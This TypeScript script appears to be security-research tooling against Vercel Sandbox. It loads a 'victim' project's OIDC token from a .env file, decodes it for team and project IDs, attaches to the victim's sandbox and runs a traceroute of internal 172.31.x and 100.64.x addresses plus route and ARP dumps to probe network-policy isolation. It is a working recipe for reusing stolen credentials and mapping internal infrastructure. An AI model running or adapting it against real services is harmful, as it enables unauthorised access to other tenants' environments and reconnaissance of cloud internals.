import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("policy:", JSON.stringify(sbx.networkPolicy));
  await sbx.writeFiles([{ path: "/tmp/trace.py", content: readFileSync("/tmp/vercel-sandbox/trace.py") }]);
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== A. UDP traceroute from sandbox ==="
timeout 90 python3 /tmp/trace.py google.com 172.31.0.2 100.64.0.1 172.31.16.7 18.232.1.245 2>&1 | head -70
echo "=== B. what interface/route? ==="
ip route 2>&1
cat /proc/net/arp 2>&1
echo DONE
`], { wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
